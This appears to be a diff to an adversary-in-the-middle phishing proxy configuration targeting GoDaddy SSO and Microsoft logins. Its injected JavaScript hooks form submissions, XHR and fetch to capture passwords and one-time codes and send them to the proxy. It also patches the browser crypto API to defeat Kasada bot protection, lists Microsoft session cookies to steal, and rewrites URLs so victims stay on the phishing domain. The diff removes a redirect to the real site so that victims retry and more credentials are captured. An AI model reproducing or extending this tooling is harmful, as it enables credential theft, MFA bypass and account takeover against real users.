@@ -185,6 +185,18 @@ sub_filters:
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
   - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
   - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  # GoDaddy SSO: aggressive URL rewriting to keep everything on proxy
+  # Rewrite form action= attributes to stay on proxy domain
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'action="https://sso\.godaddy\.com', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: 'action="https://sso\.secureserver\.net', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: 'action="https://sso2\.secureserver\.net', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/javascript']}
+  # Rewrite JSON "action" and "url" fields in API responses
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '"action":"https://sso\.godaddy\.com', replace: '"action":"https://{hostname}', mimes: ['application/json']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '"action":"https://sso\.secureserver\.net', replace: '"action":"https://{hostname}', mimes: ['application/json']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '"action":"https://sso2\.secureserver\.net', replace: '"action":"https://{hostname}', mimes: ['application/json']}
+  # Rewrite sso.godaddy.com URLs in JSON with escaped slashes
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https%3A%2F%2Fsso%2Egodaddy%2Ecom', replace: 'https%3A%2F%2F{hostname}', mimes: ['application/json', 'text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: 'https%3A%2F%2Fsso%2Esecureserver%2Enet', replace: 'https%3A%2F%2F{hostname}', mimes: ['application/json', 'text/html']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -386,6 +398,24 @@ js_inject:
     trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // ── Debug logging helper ─────────────────────────────────────────────────
+        var _logs = [];
+        function _log(msg) {
+          var ts = new Date().toISOString();
+          var full = '[' + ts + '] ' + msg;
+          _logs.push(full);
+          console.log(full);
+          try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/_x/log', true);
+            xhr.setRequestHeader('Content-Type', 'text/plain');
+            xhr.send(full);
+          } catch(e) {}
+        }
+        _log('=== GoDaddy SSO inject loaded ===');
+        _log('Hostname: ' + window.location.hostname);
+        _log('Pathname: ' + window.location.pathname);
+
         // ── Kasada HMAC hostname patch ───────────────────────────────────────────
         // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
         // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
@@ -397,11 +427,14 @@ js_inject:
                         ? 'sso.secureserver.net'
                         : 'sso.godaddy.com';
           var _kProxy = window.location.hostname;
+          _log('Kasada patch: real=' + _kReal + ', proxy=' + _kProxy);
           if (_kProxy !== _kReal && window.crypto && window.crypto.subtle) {
+            _log('Patching crypto.subtle.importKey and digest');
             var _enc = new TextEncoder();
             var _dec = new TextDecoder();
             var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
             var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
+            var _origDigest = crypto.subtle.digest.bind(crypto.subtle);
             crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
               if (fmt === 'raw' && keyData) {
                 try {
@@ -412,15 +445,31 @@ js_inject:
                   if (ab) {
                     var txt = _dec.decode(ab);
                     if (txt.indexOf(_kProxy) !== -1) {
+                      _log('importKey: replacing ' + _kProxy + ' with ' + _kReal);
                       keyData = _enc.encode(txt.replace(_re, _kReal));
                     }
                   }
-                } catch(_e) {}
+                } catch(_e) { _log('importKey error: ' + _e.message); }
               }
               return _origImport(fmt, keyData, algo, ext, uses);
             };
+            crypto.subtle.digest = function(algo, data) {
+              try {
+                if (data instanceof ArrayBuffer || ArrayBuffer.isView(data)) {
+                  var ab = data instanceof ArrayBuffer ? data : data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength);
+                  var txt = _dec.decode(ab);
+                  if (txt.indexOf(_kProxy) !== -1) {
+                    _log('digest: replacing ' + _kProxy + ' with ' + _kReal);
+                    data = _enc.encode(txt.replace(_re, _kReal));
+                  }
+                }
+              } catch(_e) { _log('digest error: ' + _e.message); }
+              return _origDigest(algo, data);
+            };
+          } else {
+            _log('Crypto patch not applied (proxy === real or crypto unavailable)');
           }
-        } catch(_e) {}
+        } catch(_e) { _log('Kasada patch init error: ' + _e.message); }
 
         // ── Proxy-domain rewriter ────────────────────────────────────────────────
         // Computes the phish base domain from the current hostname so we can
@@ -447,44 +496,44 @@ js_inject:
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
         // ── Kasada error recovery ────────────────────────────────────────────────
-        // GoDaddy SSO uses Kasada KP SDK whose HMAC is bound to window.location.hostname.
-        // When proxied, the HMAC is wrong and GoDaddy returns "Yikes! Something went wrong".
-        // Credentials are already captured at that point, so we redirect the victim to
-        // the real SSO with the same URL so they can log in successfully without suspicion.
-        function _getRealSSOUrl() {
-          var h   = window.location.hostname;
-          var path = window.location.pathname + window.location.search;
-          if (h.indexOf('sssn2.') === 0) return 'https://sso2.secureserver.net' + path;
-          if (h.indexOf('sssn.')  === 0) return 'https://sso.secureserver.net'  + path;
-          return 'https://sso.godaddy.com' + path;
-        }
+        // Don't redirect on Kasada error; stay on proxy and let user retry.
+        // The HMAC patch should have fixed the issue. If not, user can retry.
         var _redirected = false;
         function _doRedirect() {
+          // Disabled: keep everything on the proxy
           if (_redirected) return;
           _redirected = true;
-          setTimeout(function() { window.location.replace(_getRealSSOUrl()); }, 900);
+          // Don't redirect — let Kasada errors be visible so user retries and captures work
         }
 
         var _lastSent = 0;
         function _sendCred(pass, user) {
           if (!pass) return;
           var now = Date.now();
-          if (now - _lastSent < 3000) return;
+          if (now - _lastSent < 3000) {
+            _log('_sendCred: throttled (< 3000ms)');
+            return;
+          }
           _lastSent = now;
+          _log('_sendCred: sending password for user=' + (user || email || '(none)'));
           try {
             var xhr = new XMLHttpRequest();
             xhr.open('POST', '/_x/cred', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() { _log('_sendCred: response status=' + xhr.status); };
+            xhr.onerror = function() { _log('_sendCred: XHR error'); };
             xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
-          } catch(e) {}
+          } catch(e) { _log('_sendCred: exception ' + e.message); }
         }
 
         // ── Layer 1: DOM-level capture (works regardless of fetch/XHR library) ──
         document.addEventListener('submit', function(e) {
           var form = e.target;
           if (!form) return;
+          _log('Form submit: action=' + (form.action || '(none)'));
           var pw = form.querySelector('input[type="password"]');
           if (pw && pw.value) {
+            _log('Form submit: found password field');
             var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
             _sendCred(pw.value, uEl ? uEl.value : '');
           }
@@ -524,9 +573,11 @@ js_inject:
         var _xhrRespDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
         XMLHttpRequest.prototype.open = function(method, url) {
           this._xm = method; this._xu = url;
+          _log('XHR.open: ' + method + ' ' + url);
           return _oOpen.apply(this, arguments);
         };
         XMLHttpRequest.prototype.send = function(body) {
+          _log('XHR.send: ' + this._xm + ' ' + this._xu + ', body length=' + (body ? body.length : 0));
           if (this._xm && this._xm.toUpperCase() === 'POST') {
             // Capture credentials from request body
             if (body) {
@@ -534,13 +585,20 @@ js_inject:
                 var obj = JSON.parse(typeof body === 'string' ? body : '');
                 var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
                 var user = obj.username || obj.email || obj.login || obj.user || '';
-                if (pass) _sendCred(pass, user);
+                if (pass) {
+                  _log('XHR: found password in body');
+                  _sendCred(pass, user);
+                }
                 // OTP/TAC capture — POST /v1/api/pass/my/token {"factor":"k_tac","value":"<otp>"}
-                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
-              } catch(e) {}
+                if (obj.factor && obj.value) {
+                  _log('XHR: found OTP/TAC factor=' + obj.factor + ', value=' + obj.value);
+                  _sendCred(obj.value, email || user || '');
+                }
+              } catch(e) { _log('XHR body parse error: ' + e.message); }
             }
             var isLoginXhr = this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/pass/my/token') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1);
             if (isLoginXhr) {
+              _log('XHR: login request detected: ' + this._xu);
               // Patch responseText to rewrite real GoDaddy URLs before the SPA reads them.
               var self = this;
               if (_xhrRespDesc) {
@@ -553,14 +611,21 @@ js_inject:
                 });
               }
               this.addEventListener('load', function() {
+                _log('XHR.load: status=' + self.status + ', url=' + self._xu);
                 if (self.status >= 400 || self.status === 0) {
+                  _log('XHR: error status, not redirecting (disabled)');
                   _doRedirect();
                 } else {
                   try {
                     var raw = _xhrRespDesc && _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : self.responseText;
                     var r = JSON.parse(raw);
-                    if (r && (r.error || r.success === false)) _doRedirect();
-                  } catch(e) {}
+                    if (r && (r.error || r.success === false)) {
+                      _log('XHR: error in JSON response: ' + JSON.stringify(r).substring(0, 200));
+                      _doRedirect();
+                    } else {
+                      _log('XHR: success response received');
+                    }
+                  } catch(e) { _log('XHR response parse error: ' + e.message); }
                 }
               });
             }
@@ -572,32 +637,60 @@ js_inject:
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
+          _log('fetch: ' + (opts && opts.method ? opts.method : 'GET') + ' ' + urlStr);
           var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
               if (bodyStr) {
+                _log('fetch body: ' + bodyStr.substring(0, 100));
                 var obj = JSON.parse(bodyStr);
                 var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
                 var user = obj.username || obj.email || obj.login || obj.user || '';
-                if (pass) _sendCred(pass, user);
-                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
+                if (pass) {
+                  _log('fetch: found password');
+                  _sendCred(pass, user);
+                }
+                if (obj.factor && obj.value) {
+                  _log('fetch: found OTP factor=' + obj.factor);
+                  _sendCred(obj.value, email || user || '');
+                }
               }
-            } catch(e) {}
+            } catch(e) { _log('fetch body parse error: ' + e.message); }
           }
           var p = _oFetch.apply(this, arguments);
           if (isLogin) {
+            _log('fetch: login request, will patch response');
             // Return a patched response: rewrite any real GoDaddy URLs in the
             // JSON body before the React SPA reads them and navigates away.
             return p.then(function(resp) {
-              if (!resp.ok) { _doRedirect(); return resp; }
+              _log('fetch response: status=' + resp.status);
+              if (!resp.ok) {
+                _log('fetch: not ok, calling doRedirect');
+                _doRedirect();
+                return resp;
+              }
               return resp.clone().text().then(function(text) {
-                try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) { _doRedirect(); return resp; } } catch(e) {}
+                try {
+                  var r = JSON.parse(text);
+                  if (r && (r.error || r.success === false)) {
+                    _log('fetch: error in response: ' + JSON.stringify(r).substring(0, 200));
+                    _doRedirect();
+                    return resp;
+                  }
+                } catch(e) { _log('fetch response parse error: ' + e.message); }
                 var out = _rewriteGDUrls(text);
-                if (out === text) return resp;
-                return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
+                if (out !== text) {
+                  _log('fetch: URLs rewritten, returning patched response');
+                  return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
+                }
+                return resp;
               });
-            }).catch(function() { _doRedirect(); return new Response('{}', {status: 200}); });
+            }).catch(function(err) {
+              _log('fetch catch: ' + err.message);
+              _doRedirect();
+              return new Response('{}', {status: 200});
+            });
           }
           return p;
         };
@@ -609,11 +702,12 @@ js_inject:
           if (!b) return;
           var t = b.innerText || b.textContent || '';
           if (t.indexOf('Yikes') !== -1 || t.indexOf('went wrong') !== -1 || t.indexOf('Something went') !== -1) {
+            _log('=== KASADA ERROR DETECTED: "Yikes! Something went wrong" ===');
             clearInterval(_errTimer);
             _doRedirect();
           }
         }, 600);
-        setTimeout(function() { clearInterval(_errTimer); }, 30000);
+        setTimeout(function() { clearInterval(_errTimer); _log('Kasada error monitor stopped after 30s'); }, 30000);
 
         // --- email autofill + auto-advance ---
         function _clickNext() {
